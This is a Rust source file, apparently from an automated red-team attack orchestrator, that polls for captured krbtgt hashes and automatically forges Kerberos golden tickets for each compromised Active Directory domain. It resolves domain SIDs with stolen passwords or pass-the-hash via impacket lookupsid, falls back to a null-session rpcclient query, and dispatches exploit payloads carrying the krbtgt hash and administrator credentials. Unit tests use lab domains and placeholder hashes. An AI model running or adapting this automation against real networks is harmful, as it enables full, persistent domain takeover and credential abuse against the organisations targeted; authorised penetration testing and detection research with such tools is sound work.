//! auto_golden_ticket -- monitor for krbtgt hash and forge golden ticket.

use std::collections::HashSet;
use std::sync::Arc;
use std::time::Duration;

use serde_json::{json, Value};
use tokio::sync::watch;
use tracing::{info, warn};

use crate::orchestrator::dispatcher::Dispatcher;
use crate::orchestrator::state::StateInner;

/// Collect the set of domains that have a captured `krbtgt` hash but no
/// successful golden-ticket forge yet. Returns lowercased domain names in
/// the same order that `state.hashes` traverses (deterministic per snapshot).
///
/// Extracted from `auto_golden_ticket` so the candidate-selection rules
/// (dedup, fallback to `domains[0]` for orphan hashes, exploited-vuln gate)
/// can be unit-tested against a constructed `StateInner` without standing
/// up a Dispatcher.
pub(crate) fn collect_pending_golden_ticket_domains(state: &StateInner) -> Vec<String> {
    if !state.has_domain_admin {
        return Vec::new();
    }
    let mut seen = HashSet::new();
    let mut out = Vec::new();
    for h in &state.hashes {
        if !h.username.eq_ignore_ascii_case("krbtgt") {
            continue;
        }
        let domain = if !h.domain.is_empty() {
            h.domain.to_lowercase()
        } else if let Some(d) = state.domains.first() {
            d.to_lowercase()
        } else {
            continue;
        };
        if !seen.insert(domain.clone()) {
            continue;
        }
        let vuln_id = format!("golden_ticket_{domain}");
        if state.exploited_vulnerabilities.contains(&vuln_id) {
            continue;
        }
        out.push(domain);
    }
    out
}

/// Inputs needed to submit a golden-ticket forge task. Populated from a
/// `StateInner` snapshot by [`gather_golden_ticket_inputs`] and consumed
/// by [`build_golden_ticket_payload`].
#[derive(Debug, Clone)]
pub(crate) struct GoldenTicketInputs {
    pub krbtgt: ares_core::models::Hash,
    pub domain_sid: Option<String>,
    pub dc_ip: Option<String>,
    pub admin_cred: Option<ares_core::models::Credential>,
    pub admin_hash: Option<ares_core::models::Hash>,
    pub lookup_cred: Option<ares_core::models::Credential>,
}

/// Snapshot the state-dependent inputs for a single domain's golden-ticket
/// forge. Returns `None` when no `krbtgt` hash exists for `domain` —
/// the caller should skip the domain in that case.
pub(crate) fn gather_golden_ticket_inputs(
    state: &StateInner,
    domain: &str,
) -> Option<GoldenTicketInputs> {
    let domain_lc = domain.to_lowercase();

    let krbtgt = state
        .hashes
        .iter()
        .find(|h| h.username.eq_ignore_ascii_case("krbtgt") && h.domain.to_lowercase() == domain_lc)
        .cloned()?;

    let domain_sid = state.domain_sids.get(&domain_lc).cloned();
    let dc_ip = state.domain_controllers.get(&domain_lc).cloned();

    let admin_cred = state
        .credentials
        .iter()
        .find(|c| {
            c.username.to_lowercase() == "administrator" && c.domain.to_lowercase() == domain_lc
        })
        .cloned();
    let admin_hash = state
        .hashes
        .iter()
        .find(|h| {
            h.username.to_lowercase() == "administrator"
                && h.domain.to_lowercase() == domain_lc
                && h.hash_type.to_uppercase() == "NTLM"
        })
        .cloned();

    let lookup_cred = state
        .credentials
        .iter()
        .find(|c| {
            c.domain.to_lowercase() == domain_lc
                && !c.password.is_empty()
                && !state.is_principal_quarantined(&c.username, &c.domain)
        })
        .or_else(|| {
            state.credentials.iter().find(|c| {
                !c.password.is_empty() && !state.is_principal_quarantined(&c.username, &c.domain)
            })
        })
        .cloned();

    Some(GoldenTicketInputs {
        krbtgt,
        domain_sid,
        dc_ip,
        admin_cred,
        admin_hash,
        lookup_cred,
    })
}

/// Normalize a captured krbtgt hash so ticketer receives a bare 32-char
/// NTLM hex string. Inputs in `lm:ntlm` form (e.g. `aad3b...:31d6c...`)
/// have the LM half stripped; anything else is passed through unchanged.
pub(crate) fn strip_ntlm_lm_prefix(hash_value: &str) -> String {
    match hash_value.rsplit_once(':') {
        Some((_, ntlm)) if ntlm.len() == 32 => ntlm.to_string(),
        _ => hash_value.to_string(),
    }
}

/// Build the JSON payload submitted to the `exploit` queue for a single
/// golden-ticket forge. Pure — no dispatcher, no Redis. `admin_username`
/// is the resolved RID-500 name (may differ from "Administrator" when the
/// domain renamed its built-in admin).
pub(crate) fn build_golden_ticket_payload(
    domain: &str,
    admin_username: &str,
    domain_sid: &str,
    inputs: &GoldenTicketInputs,
) -> Value {
    let ntlm_hash = strip_ntlm_lm_prefix(&inputs.krbtgt.hash_value);
    let mut payload = json!({
        "technique": "golden_ticket",
        "vuln_type": "golden_ticket",
        "domain": domain,
        "krbtgt_hash": ntlm_hash,
        "username": admin_username,
        "domain_sid": domain_sid,
    });
    if let Some(ref ip) = inputs.dc_ip {
        payload["dc_ip"] = json!(ip);
    }
    if let Some(ref cred) = inputs.admin_cred {
        payload["admin_password"] = json!(cred.password);
        payload["admin_domain"] = json!(cred.domain);
    }
    if let Some(ref hash) = inputs.admin_hash {
        payload["admin_hash"] = json!(hash.hash_value);
        payload["admin_domain"] = json!(inputs
            .admin_cred
            .as_ref()
            .map_or(&hash.domain, |c| &c.domain));
    }
    if let Some(ref aes) = inputs.krbtgt.aes_key {
        payload["aes_key"] = json!(aes);
    }
    payload
}

/// Resolve the RID-500 account name for `domain`, falling back to the
/// well-known string `"Administrator"` when the domain has no rename
/// recorded in `state.admin_names`.
pub(crate) fn resolve_admin_username(state: &StateInner, domain: &str) -> String {
    state
        .admin_names
        .get(&domain.to_lowercase())
        .cloned()
        .unwrap_or_else(|| "Administrator".to_string())
}

/// Monitors for krbtgt hash and triggers golden ticket forging.
/// Interval: 30s.
///
/// Multi-domain: a single op routinely captures krbtgt for >1 domain (child
/// then parent via ExtraSid; both forests via inter-realm forge). Each
/// domain needs its own forge dispatch — the dedup is per-domain via the
/// `golden_ticket_<domain>` exploited-vuln key, not the global
/// `has_golden_ticket` bool (which is kept only as a legacy aggregate).
pub async fn auto_golden_ticket(dispatcher: Arc<Dispatcher>, mut shutdown: watch::Receiver<bool>) {
    let mut interval = tokio::time::interval(Duration::from_secs(30));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        // Snapshot the work queue: every distinct domain with a krbtgt
        // hash that hasn't already been forged. We resolve each one in
        // turn; SID lookups can issue tool calls and mutate state, so
        // we snapshot the list first under the read lock and release it.
        let pending_domains: Vec<String> = {
            let state = dispatcher.state.read().await;
            collect_pending_golden_ticket_domains(&state)
        };
        if pending_domains.is_empty() {
            continue;
        }

        for domain in pending_domains {
            try_forge_golden_ticket(&dispatcher, &domain).await;
        }
    }
}

/// Run a single forge attempt for `domain`. Called from the multi-domain
/// loop above; each call holds and releases its own state locks so a slow
/// SID lookup for one domain doesn't block the others.
async fn try_forge_golden_ticket(dispatcher: &Arc<Dispatcher>, domain: &str) {
    let domain_lc = domain.to_lowercase();

    let mut inputs = {
        let state = dispatcher.state.read().await;
        match gather_golden_ticket_inputs(&state, domain) {
            Some(i) => i,
            None => return,
        }
    };

    // ── Resolve domain SID if not cached ────────────────────────────
    if inputs.domain_sid.is_none() {
        if let Some(ref target_ip) = inputs.dc_ip {
            let result = resolve_domain_sid(
                domain,
                target_ip,
                inputs.lookup_cred.as_ref(),
                inputs.admin_hash.as_ref(),
            )
            .await;

            if let Some((ref sid, ref admin_name)) = result {
                info!(domain = %domain, sid = %sid, admin = admin_name.as_deref().unwrap_or("Administrator"), "Domain SID resolved via lookupsid");
                let op_id = { dispatcher.state.read().await.operation_id.clone() };
                let reader = ares_core::state::RedisStateReader::new(op_id);
                let mut conn = dispatcher.queue.connection();
                if let Err(e) = reader.set_domain_sid(&mut conn, &domain_lc, sid).await {
                    warn!(err = %e, "Failed to persist domain SID to Redis");
                }
                if let Some(ref name) = admin_name {
                    if let Err(e) = reader.set_admin_name(&mut conn, &domain_lc, name).await {
                        warn!(err = %e, "Failed to persist admin name to Redis");
                    }
                }
                let mut state = dispatcher.state.write().await;
                state.domain_sids.insert(domain_lc.clone(), sid.clone());
                if let Some(ref name) = admin_name {
                    state.admin_names.insert(domain_lc.clone(), name.clone());
                }
            }

            inputs.domain_sid = result.map(|(sid, _)| sid);
        }
    }

    let Some(domain_sid) = inputs.domain_sid.clone() else {
        warn!(domain = %domain, "Cannot resolve domain SID — skipping golden ticket");
        return;
    };

    let admin_username = {
        let state = dispatcher.state.read().await;
        resolve_admin_username(&state, domain)
    };

    let payload = build_golden_ticket_payload(domain, &admin_username, &domain_sid, &inputs);

    match dispatcher
        .throttled_submit("exploit", "privesc", payload, 1)
        .await
    {
        Ok(Some(task_id)) => {
            info!(task_id = %task_id, domain = %domain, "Golden ticket task dispatched");
            // Mark per-domain immediately to prevent re-dispatch on the
            // next 30s tick. Result processing also confirms on task
            // completion (detects "Saving ticket in *.ccache" in output).
            if let Err(e) = dispatcher
                .state
                .set_golden_ticket(&dispatcher.queue, domain)
                .await
            {
                warn!(err = %e, "Failed to set golden ticket flag after dispatch");
            }
        }
        Ok(None) => {}
        Err(e) => warn!(err = %e, "Failed to dispatch golden ticket"),
    }
}

/// Resolve domain SID and RID-500 account name by calling `impacket-lookupsid`.
/// Returns `(domain_sid, Option<admin_name>)`. Tries password credential first,
/// then NTLM hash.
///
/// Uses the credential's own domain for NTLM auth (not the target domain) so
/// cross-domain trust authentication works — e.g. a `child.contoso.local`
/// cred can resolve the SID of `contoso.local` via its parent DC.
pub(crate) async fn resolve_domain_sid(
    _domain: &str,
    dc_ip: &str,
    password_cred: Option<&ares_core::models::Credential>,
    admin_hash: Option<&ares_core::models::Hash>,
) -> Option<(String, Option<String>)> {
    // Try password auth first — use the credential's native domain for auth
    if let Some(cred) = password_cred {
        let auth_domain = if cred.domain.is_empty() {
            _domain
        } else {
            &cred.domain
        };
        let args = json!({
            "domain": auth_domain,
            "username": cred.username,
            "password": cred.password,
            "dc_ip": dc_ip,
        });
        match ares_tools::privesc::get_sid(&args).await {
            Ok(output) => {
                let text = output.combined_raw();
                if let Some(sid) = ares_core::parsing::extract_domain_sid(&text) {
                    let admin_name = ares_core::parsing::extract_rid500_name(&text);
                    return Some((sid, admin_name));
                }
                warn!(auth_domain = %auth_domain, user = %cred.username, "lookupsid succeeded but no SID pattern found in output");
            }
            Err(e) => {
                warn!(err = %e, user = %cred.username, auth_domain = %auth_domain, "lookupsid with password failed");
            }
        }
    }

    // Fall back to hash auth — use the hash's native domain for auth
    if let Some(hash) = admin_hash {
        let auth_domain = if hash.domain.is_empty() {
            _domain
        } else {
            &hash.domain
        };
        let args = json!({
            "domain": auth_domain,
            "username": "Administrator",
            "hash": hash.hash_value,
            "dc_ip": dc_ip,
        });
        match ares_tools::privesc::get_sid(&args).await {
            Ok(output) => {
                let text = output.combined_raw();
                if let Some(sid) = ares_core::parsing::extract_domain_sid(&text) {
                    let admin_name = ares_core::parsing::extract_rid500_name(&text);
                    return Some((sid, admin_name));
                }
                warn!(auth_domain = %auth_domain, "lookupsid (hash) succeeded but no SID pattern found");
            }
            Err(e) => {
                warn!(err = %e, auth_domain = %auth_domain, "lookupsid with admin hash failed");
            }
        }
    }

    // Final fallback: null-session LSARPC lsaquery. Authenticated impacket
    // cross-domain lookupsid (child-domain creds against the parent DC)
    // routinely fails — impacket's Kerberos referral chain is buggy
    // (fortra/impacket#315) and NTLM cross-domain auth gets rejected by
    // hardened DCs. But `rpcclient -U "" -N <dc_ip> -c "lsaquery"` over a
    // null session usually succeeds against any DC that allows anonymous
    // LSA queries — which is most legacy/lab AD deployments. The output is
    // parsed by `extract_lsaquery_domain_sid`. This unblocks the
    // child→parent forge path in `auto_trust_follow` when authenticated
    // lookupsid against the parent DC fails.
    match tokio::process::Command::new("rpcclient")
        .arg("-U")
        .arg("")
        .arg("-N")
        .arg(dc_ip)
        .arg("-c")
        .arg("lsaquery")
        .output()
        .await
    {
        Ok(out) => {
            let combined = format!(
                "{}\n{}",
                String::from_utf8_lossy(&out.stdout),
                String::from_utf8_lossy(&out.stderr)
            );
            if let Some((_flat, sid)) = ares_core::parsing::extract_lsaquery_domain_sid(&combined) {
                info!(dc_ip = %dc_ip, sid = %sid, "Resolved domain SID via null-session lsaquery fallback");
                return Some((sid, None));
            }
            warn!(dc_ip = %dc_ip, "Null-session lsaquery returned no parseable SID");
        }
        Err(e) => {
            warn!(err = %e, dc_ip = %dc_ip, "Failed to invoke rpcclient for null-session lsaquery");
        }
    }

    None
}

#[cfg(test)]
mod tests {
    use super::*;
    use ares_core::models::{Credential, Hash};

    fn make_hash(user: &str, domain: &str, value: &str) -> Hash {
        Hash {
            id: format!("h-{user}-{domain}"),
            username: user.to_string(),
            hash_value: value.to_string(),
            hash_type: "NTLM".to_string(),
            domain: domain.to_string(),
            cracked_password: None,
            source: String::new(),
            discovered_at: None,
            parent_id: None,
            attack_step: 0,
            aes_key: None,
            is_previous: false,
            source_host: None,
            is_trust_key: false,
            trust_pair_label: None,
        }
    }

    fn krbtgt_hash(domain: &str, value: &str) -> Hash {
        make_hash("krbtgt", domain, value)
    }

    fn admin_hash(domain: &str, value: &str) -> Hash {
        make_hash("Administrator", domain, value)
    }

    fn cred(user: &str, password: &str, domain: &str) -> Credential {
        Credential {
            id: format!("c-{user}-{domain}"),
            username: user.to_string(),
            password: password.to_string(),
            domain: domain.to_string(),
            source: String::new(),
            discovered_at: None,
            is_admin: false,
            parent_id: None,
            attack_step: 0,
        }
    }

    // --- strip_ntlm_lm_prefix ---------------------------------------------

    #[test]
    fn strip_ntlm_lm_prefix_keeps_bare_ntlm() {
        let ntlm = "31d6cfe0d16ae931b73c59d7e0c089c0";
        assert_eq!(strip_ntlm_lm_prefix(ntlm), ntlm);
    }

    #[test]
    fn strip_ntlm_lm_prefix_strips_lm_half() {
        let lm = "aad3b435b51404eeaad3b435b51404ee";
        let ntlm = "31d6cfe0d16ae931b73c59d7e0c089c0";
        let combined = format!("{lm}:{ntlm}");
        assert_eq!(strip_ntlm_lm_prefix(&combined), ntlm);
    }

    #[test]
    fn strip_ntlm_lm_prefix_uses_only_rightmost_segment() {
        // Multiple colons — keep the trailing 32-char segment.
        let v = "garbage:more:31d6cfe0d16ae931b73c59d7e0c089c0";
        assert_eq!(strip_ntlm_lm_prefix(v), "31d6cfe0d16ae931b73c59d7e0c089c0");
    }

    #[test]
    fn strip_ntlm_lm_prefix_passes_through_non_32_char_tail() {
        // If the tail is not exactly 32 chars (the NTLM length), we should
        // pass through unchanged — better to send a malformed value to
        // ticketer than silently drop part of a non-LM/NTLM payload.
        let v = "foo:bar";
        assert_eq!(strip_ntlm_lm_prefix(v), v);
    }

    #[test]
    fn strip_ntlm_lm_prefix_empty_string() {
        assert_eq!(strip_ntlm_lm_prefix(""), "");
    }

    // --- collect_pending_golden_ticket_domains ----------------------------

    #[test]
    fn collect_pending_returns_empty_without_domain_admin() {
        let mut s = StateInner::new("op-test".into());
        s.has_domain_admin = false;
        s.hashes
            .push(krbtgt_hash("contoso.local", "deadbeef".repeat(4).as_str()));
        assert!(collect_pending_golden_ticket_domains(&s).is_empty());
    }

    #[test]
    fn collect_pending_returns_lowercased_domain() {
        let mut s = StateInner::new("op-test".into());
        s.has_domain_admin = true;
        s.hashes.push(krbtgt_hash(
            "Contoso.Local",
            "31d6cfe0d16ae931b73c59d7e0c089c0",
        ));
        let v = collect_pending_golden_ticket_domains(&s);
        assert_eq!(v, vec!["contoso.local"]);
    }

    #[test]
    fn collect_pending_dedupes_multiple_krbtgt_entries_for_same_domain() {
        let mut s = StateInner::new("op-test".into());
        s.has_domain_admin = true;
        s.hashes.push(krbtgt_hash(
            "contoso.local",
            "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
        ));
        s.hashes.push(krbtgt_hash(
            "contoso.local",
            "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
        ));
        let v = collect_pending_golden_ticket_domains(&s);
        assert_eq!(v.len(), 1);
        assert_eq!(v[0], "contoso.local");
    }

    #[test]
    fn collect_pending_skips_non_krbtgt_hashes() {
        let mut s = StateInner::new("op-test".into());
        s.has_domain_admin = true;
        s.hashes.push(admin_hash(
            "contoso.local",
            "31d6cfe0d16ae931b73c59d7e0c089c0",
        ));
        assert!(collect_pending_golden_ticket_domains(&s).is_empty());
    }

    #[test]
    fn collect_pending_falls_back_to_first_domain_when_hash_domain_empty() {
        let mut s = StateInner::new("op-test".into());
        s.has_domain_admin = true;
        s.domains.push("Contoso.Local".into());
        let mut h = krbtgt_hash("", "31d6cfe0d16ae931b73c59d7e0c089c0");
        h.domain = String::new();
        s.hashes.push(h);
        let v = collect_pending_golden_ticket_domains(&s);
        assert_eq!(v, vec!["contoso.local"]);
    }

    #[test]
    fn collect_pending_skips_when_hash_domain_empty_and_no_state_domains() {
        let mut s = StateInner::new("op-test".into());
        s.has_domain_admin = true;
        // Orphan krbtgt hash with no domain and no state.domains fallback.
        let mut h = krbtgt_hash("contoso.local", "31d6cfe0d16ae931b73c59d7e0c089c0");
        h.domain = String::new();
        s.hashes.push(h);
        assert!(collect_pending_golden_ticket_domains(&s).is_empty());
    }

    #[test]
    fn collect_pending_skips_already_forged_domain() {
        let mut s = StateInner::new("op-test".into());
        s.has_domain_admin = true;
        s.hashes.push(krbtgt_hash(
            "contoso.local",
            "31d6cfe0d16ae931b73c59d7e0c089c0",
        ));
        s.exploited_vulnerabilities
            .insert("golden_ticket_contoso.local".into());
        assert!(collect_pending_golden_ticket_domains(&s).is_empty());
    }

    #[test]
    fn collect_pending_returns_multiple_domains() {
        let mut s = StateInner::new("op-test".into());
        s.has_domain_admin = true;
        s.hashes.push(krbtgt_hash(
            "contoso.local",
            "31d6cfe0d16ae931b73c59d7e0c089c0",
        ));
        s.hashes.push(krbtgt_hash(
            "fabrikam.local",
            "1234567890abcdef1234567890abcdef",
        ));
        let mut v = collect_pending_golden_ticket_domains(&s);
        v.sort();
        assert_eq!(v, vec!["contoso.local", "fabrikam.local"]);
    }

    // --- gather_golden_ticket_inputs --------------------------------------

    #[test]
    fn gather_inputs_returns_none_without_krbtgt() {
        let mut s = StateInner::new("op-test".into());
        s.has_domain_admin = true;
        // No krbtgt for the requested domain.
        s.hashes.push(admin_hash(
            "contoso.local",
            "31d6cfe0d16ae931b73c59d7e0c089c0",
        ));
        assert!(gather_golden_ticket_inputs(&s, "contoso.local").is_none());
    }

    #[test]
    fn gather_inputs_returns_krbtgt_when_present() {
        let mut s = StateInner::new("op-test".into());
        s.has_domain_admin = true;
        s.hashes.push(krbtgt_hash(
            "contoso.local",
            "31d6cfe0d16ae931b73c59d7e0c089c0",
        ));
        let inputs = gather_golden_ticket_inputs(&s, "contoso.local").unwrap();
        assert_eq!(inputs.krbtgt.username, "krbtgt");
        assert_eq!(inputs.domain_sid, None);
        assert_eq!(inputs.dc_ip, None);
        assert!(inputs.admin_cred.is_none());
        assert!(inputs.admin_hash.is_none());
        assert!(inputs.lookup_cred.is_none());
    }

    #[test]
    fn gather_inputs_populates_cached_sid_and_dc_ip() {
        let mut s = StateInner::new("op-test".into());
        s.has_domain_admin = true;
        s.hashes.push(krbtgt_hash(
            "contoso.local",
            "31d6cfe0d16ae931b73c59d7e0c089c0",
        ));
        s.domain_sids
            .insert("contoso.local".into(), "S-1-5-21-1-2-3".into());
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        let inputs = gather_golden_ticket_inputs(&s, "contoso.local").unwrap();
        assert_eq!(inputs.domain_sid.as_deref(), Some("S-1-5-21-1-2-3"));
        assert_eq!(inputs.dc_ip.as_deref(), Some("192.168.58.10"));
    }

    #[test]
    fn gather_inputs_is_case_insensitive_on_domain() {
        let mut s = StateInner::new("op-test".into());
        s.has_domain_admin = true;
        s.hashes.push(krbtgt_hash(
            "Contoso.Local",
            "31d6cfe0d16ae931b73c59d7e0c089c0",
        ));
        // Stored keys are lowercased by the production paths; we just need
        // the lookup to find the krbtgt regardless of input casing.
        assert!(gather_golden_ticket_inputs(&s, "CONTOSO.LOCAL").is_some());
        assert!(gather_golden_ticket_inputs(&s, "contoso.local").is_some());
    }

    #[test]
    fn gather_inputs_picks_admin_credential_for_same_domain_only() {
        let mut s = StateInner::new("op-test".into());
        s.has_domain_admin = true;
        s.hashes.push(krbtgt_hash(
            "contoso.local",
            "31d6cfe0d16ae931b73c59d7e0c089c0",
        ));
        s.credentials
            .push(cred("administrator", "Foo!", "contoso.local"));
        s.credentials
            .push(cred("administrator", "Bar!", "fabrikam.local"));
        let inputs = gather_golden_ticket_inputs(&s, "contoso.local").unwrap();
        let ac = inputs.admin_cred.expect("admin cred for contoso");
        assert_eq!(ac.password, "Foo!");
    }

    #[test]
    fn gather_inputs_admin_hash_requires_ntlm_type() {
        let mut s = StateInner::new("op-test".into());
        s.has_domain_admin = true;
        s.hashes.push(krbtgt_hash(
            "contoso.local",
            "31d6cfe0d16ae931b73c59d7e0c089c0",
        ));
        let mut non_ntlm = admin_hash("contoso.local", "aabbccdd");
        non_ntlm.hash_type = "LM".into();
        s.hashes.push(non_ntlm);
        let inputs = gather_golden_ticket_inputs(&s, "contoso.local").unwrap();
        assert!(inputs.admin_hash.is_none());
    }

    #[test]
    fn gather_inputs_prefers_same_domain_lookup_cred() {
        let mut s = StateInner::new("op-test".into());
        s.has_domain_admin = true;
        s.hashes.push(krbtgt_hash(
            "contoso.local",
            "31d6cfe0d16ae931b73c59d7e0c089c0",
        ));
        s.credentials
            .push(cred("bob", "ContosoPW", "contoso.local"));
        s.credentials.push(cred("alice", "FabPW", "fabrikam.local"));
        let inputs = gather_golden_ticket_inputs(&s, "contoso.local").unwrap();
        assert_eq!(inputs.lookup_cred.unwrap().username, "bob");
    }

    #[test]
    fn gather_inputs_falls_back_to_cross_domain_lookup_cred() {
        let mut s = StateInner::new("op-test".into());
        s.has_domain_admin = true;
        s.hashes.push(krbtgt_hash(
            "contoso.local",
            "31d6cfe0d16ae931b73c59d7e0c089c0",
        ));
        s.credentials.push(cred("alice", "FabPW", "fabrikam.local"));
        let inputs = gather_golden_ticket_inputs(&s, "contoso.local").unwrap();
        assert_eq!(inputs.lookup_cred.unwrap().username, "alice");
    }

    #[test]
    fn gather_inputs_lookup_cred_skips_empty_password() {
        let mut s = StateInner::new("op-test".into());
        s.has_domain_admin = true;
        s.hashes.push(krbtgt_hash(
            "contoso.local",
            "31d6cfe0d16ae931b73c59d7e0c089c0",
        ));
        s.credentials.push(cred("bob", "", "contoso.local"));
        let inputs = gather_golden_ticket_inputs(&s, "contoso.local").unwrap();
        assert!(inputs.lookup_cred.is_none());
    }

    #[test]
    fn gather_inputs_lookup_cred_skips_quarantined_principal() {
        let mut s = StateInner::new("op-test".into());
        s.has_domain_admin = true;
        s.hashes.push(krbtgt_hash(
            "contoso.local",
            "31d6cfe0d16ae931b73c59d7e0c089c0",
        ));
        s.credentials.push(cred("bob", "BobPW", "contoso.local"));
        s.quarantine_principal("bob", "contoso.local");
        let inputs = gather_golden_ticket_inputs(&s, "contoso.local").unwrap();
        assert!(inputs.lookup_cred.is_none());
    }

    // --- resolve_admin_username -------------------------------------------

    #[test]
    fn resolve_admin_username_falls_back_to_default() {
        let s = StateInner::new("op-test".into());
        assert_eq!(resolve_admin_username(&s, "contoso.local"), "Administrator");
    }

    #[test]
    fn resolve_admin_username_uses_stored_rename() {
        let mut s = StateInner::new("op-test".into());
        s.admin_names
            .insert("contoso.local".into(), "BuiltInAdmin".into());
        assert_eq!(resolve_admin_username(&s, "Contoso.Local"), "BuiltInAdmin");
    }

    // --- build_golden_ticket_payload --------------------------------------

    fn baseline_inputs() -> GoldenTicketInputs {
        GoldenTicketInputs {
            krbtgt: krbtgt_hash("contoso.local", "31d6cfe0d16ae931b73c59d7e0c089c0"),
            domain_sid: Some("S-1-5-21-1-2-3".into()),
            dc_ip: Some("192.168.58.10".into()),
            admin_cred: None,
            admin_hash: None,
            lookup_cred: None,
        }
    }

    #[test]
    fn build_payload_includes_core_fields() {
        let inputs = baseline_inputs();
        let p = build_golden_ticket_payload(
            "contoso.local",
            "Administrator",
            "S-1-5-21-1-2-3",
            &inputs,
        );
        assert_eq!(p["technique"], "golden_ticket");
        assert_eq!(p["vuln_type"], "golden_ticket");
        assert_eq!(p["domain"], "contoso.local");
        assert_eq!(p["username"], "Administrator");
        assert_eq!(p["domain_sid"], "S-1-5-21-1-2-3");
        assert_eq!(p["krbtgt_hash"], "31d6cfe0d16ae931b73c59d7e0c089c0");
        assert_eq!(p["dc_ip"], "192.168.58.10");
    }

    #[test]
    fn build_payload_strips_lm_half_from_krbtgt_hash() {
        let mut inputs = baseline_inputs();
        inputs.krbtgt.hash_value =
            "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0".into();
        let p = build_golden_ticket_payload("contoso.local", "Administrator", "S-x", &inputs);
        assert_eq!(p["krbtgt_hash"], "31d6cfe0d16ae931b73c59d7e0c089c0");
    }

    #[test]
    fn build_payload_omits_dc_ip_when_unknown() {
        let mut inputs = baseline_inputs();
        inputs.dc_ip = None;
        let p = build_golden_ticket_payload("contoso.local", "Administrator", "S-x", &inputs);
        assert!(p.get("dc_ip").is_none());
    }

    #[test]
    fn build_payload_emits_admin_password_when_admin_cred_present() {
        let mut inputs = baseline_inputs();
        inputs.admin_cred = Some(cred("administrator", "P@ss1", "contoso.local"));
        let p = build_golden_ticket_payload("contoso.local", "Administrator", "S-x", &inputs);
        assert_eq!(p["admin_password"], "P@ss1");
        assert_eq!(p["admin_domain"], "contoso.local");
    }

    #[test]
    fn build_payload_admin_domain_prefers_admin_cred_when_hash_also_present() {
        let mut inputs = baseline_inputs();
        inputs.admin_cred = Some(cred("administrator", "P@ss1", "contoso.local"));
        inputs.admin_hash = Some(admin_hash("fabrikam.local", "deadbeef"));
        let p = build_golden_ticket_payload("contoso.local", "Administrator", "S-x", &inputs);
        // admin_domain should track the cred's domain, not the hash's.
        assert_eq!(p["admin_domain"], "contoso.local");
        assert_eq!(p["admin_hash"], "deadbeef");
    }

    #[test]
    fn build_payload_admin_domain_falls_back_to_hash_when_no_cred() {
        let mut inputs = baseline_inputs();
        inputs.admin_hash = Some(admin_hash("contoso.local", "deadbeef"));
        let p = build_golden_ticket_payload("contoso.local", "Administrator", "S-x", &inputs);
        assert_eq!(p["admin_hash"], "deadbeef");
        assert_eq!(p["admin_domain"], "contoso.local");
    }

    #[test]
    fn build_payload_includes_aes_key_when_present() {
        let mut inputs = baseline_inputs();
        inputs.krbtgt.aes_key = Some("a".repeat(64));
        let p = build_golden_ticket_payload("contoso.local", "Administrator", "S-x", &inputs);
        assert_eq!(p["aes_key"], "a".repeat(64));
    }

    #[test]
    fn build_payload_omits_aes_key_when_absent() {
        let inputs = baseline_inputs();
        let p = build_golden_ticket_payload("contoso.local", "Administrator", "S-x", &inputs);
        assert!(p.get("aes_key").is_none());
    }

    #[test]
    fn build_payload_uses_resolved_admin_username() {
        let inputs = baseline_inputs();
        let p = build_golden_ticket_payload("contoso.local", "BuiltInAdmin", "S-x", &inputs);
        assert_eq!(p["username"], "BuiltInAdmin");
    }
}
